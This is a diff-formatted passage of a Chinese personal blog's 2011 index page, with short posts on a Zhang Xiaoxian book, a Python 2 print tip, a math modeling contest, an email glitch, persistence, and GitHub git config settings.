+<p>不知怎么我又喜欢上了经济学的东西，原因很复杂，简单地说是事物之间那种千丝万缕的联系，而且我发现计算机系和经济系有着无法分割的联系，所以我还是喜欢点经济吧。</p>
+
+<p>今天稍微有点冲动买下了张小娴的一本新作——《想念》。首先声明一下，我不是因为这个名字才去买的，是我本身就喜欢张小娴写的一些文章，虽然自己没看过几篇，但有些耳熟能详的还是听过，比如“世上最远的距离不是⋯⋯而是⋯⋯”。一个计算机人士光是看技术书籍只能提高技术能力，而光靠技术，在这个社会中还是很难过上好日子的，如果你只是希望饿不着那就算啦。</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-05T21:50:00+08:00" pubdate data-updated="true">Jul 5<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/shu/'>书</a>, <a class='category' href='/blog/categories/zhe-si/'>哲思</a>, <a class='category' href='/blog/categories/zhang-xiao-xian/'>张小娴</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/03/comma-in-print-func-in-python/">
+		
+			Python中print中的逗号</a>
+	</h2>
+	<div class="entry-content">
+		<p>以往可能会写这样的代码：</p>
+
+<pre class="prettyprint linenums bush:python" lang="python">print x 
+print y</pre>
+
+
+<p> 当然，x、y在前面都是定义过的变量，此时，如果在x后面加一个逗号，再看输出结果，print就不会再换行了，只会在输出完x后加一个空格接着就输出y了，这点不错！</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-03T20:11:00+08:00" pubdate data-updated="true">Jul 3<span>rd</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/03/i-will-take-part-in-mathematical-modeling/">
+		
+			我要参加数学建模了</a>
+	</h2>
+	<div class="entry-content">
+		<p>这已经是很久之前的事情了，目前早就结束了报名。刚刚看到要买的书中有这样一本书－－《数学建模》，这才想起来还有这样一件重要的事情。</p>
+
+<p>由于是第一次参加这样的专业性比赛，无经验、无指导让我无所畏惧，也无所担心。因为本来就不喜欢别人帮忙得来的成绩，所以我们没有选择指导老师，其实指导老师被抢走也是一个原因，又加上报名手册上鼓励学生不找指导老师，于是我们就大胆地抛弃了指导老师。</p>
+
+<p>无经验，确实没参与过这类比赛，只是听过有这样的比赛，姑且用来试试数学的思维吧，虽然考试成绩还能凑合，但实际应用一定会让我们捉襟见肘。</p>
+
+<p>也不是完全没有好处－－有两个美女和我一起参加，这算是动力了吧！</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-03T12:47:00+08:00" pubdate data-updated="true">Jul 3<span>rd</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/shu-xue-jian-mo/'>数学建模</a>, <a class='category' href='/blog/categories/ji-lu-wo-can-jia-shu-xue-jian-mo-de-shi-qing/'>记录我参加数学建模的事情</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/02/mail-problem/">
+		
+			发邮件的时候遇到的问题</a>
+	</h2>
+	<div class="entry-content">
+		<p>不知道是不是邮件客户端的问题，我从已发邮件中找了一封，然后回复这封邮件，接着我就收到了我刚刚回复的内容，并且作为了一封新邮件收到的，但对方收不到什么，而我只有在收件箱中选择邮件回复的时候对方才能正常收到邮件。怎么给我发出去的邮件继续追加内容的时候就是给自己发内容呢？！</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-02T08:01:00+08:00" pubdate data-updated="true">Jul 2<span>nd</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/ji-zhu/'>技术</a>, <a class='category' href='/blog/categories/you-jian/'>邮件</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/06/29/everything-need-persistence/">
+		
+			万事唯有坚持</a>
+	</h2>
+	<div class="entry-content">
+		<p>本以为这个话题我以前似乎说到过，翻了一会日志却没找到。</p>
+
+<p>这是刚刚看Mac下的FIT输入法主页的时候想起来的，主页上有个广告：“5年20万果粉的选择”。20W这个用户量相当大了呢，暂且不说有没有统计问题，这么大的用户量绝非一日之功，再看前面，5年啊！输入法是一个基础性的软件，每天都会用很多次，坚持开发维护了5年的这样一个软件，不断积累了这么庞大的用户，的确是不一般。真想采访一下他们在这5年来的所感所想。</p>
+
+<p>再看Facebook，2004年2月4日上线，到现在有7年多的时间，稳居世界社交网站第一的宝座；Twitter也是经历过这样的历程。</p>
+
+<p>iphone上的应用，愤怒的小鸟，也是在做了很多产品之后继续坚持下去才获得今天的成功；植物大战僵尸的公司，在制作这款游戏时竟然优化了3年，这等坚持，不是一般的！</p>
+
+<p>还有恋爱过程中的各种坚持…</p>
+
+<p>总结一下，一个人能否坚持下去其实和这个人是否能够说服自己坚持下去的动力有一定关系，还有一点就是在坚持的过程中由于未来的不可预知性，容易中途放弃。</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-06-29T21:52:00+08:00" pubdate data-updated="true">Jun 29<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/zhe-si/'>哲思</a>, <a class='category' href='/blog/categories/jian-chi/'>坚持</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/06/21/git-config-for-github-com/">
+		
+			针对github的两条设置</a>
+	</h2>
+	<div class="entry-content">
+		<p>刚刚看到github的help页面上有两条关于git的设置，是针对github用的：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">git config --global github.user USERNAME 
+git config --global github.token TOKEN</pre>
+
+
+<p> 其中的TOKEN要从github网站的帐户管理中得到，而且这个TOKEN和密码相关，如果你更改了密码，需要重新设置。但我还不清楚设置了这个对于github的提交有什么特殊的好处，等以后用用再说吧。</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-06-21T16:32:00+08:00" pubdate data-updated="true">Jun 21<span>st</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/git/'>git</a>, <a class='category' href='/blog/categories/github/'>github</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
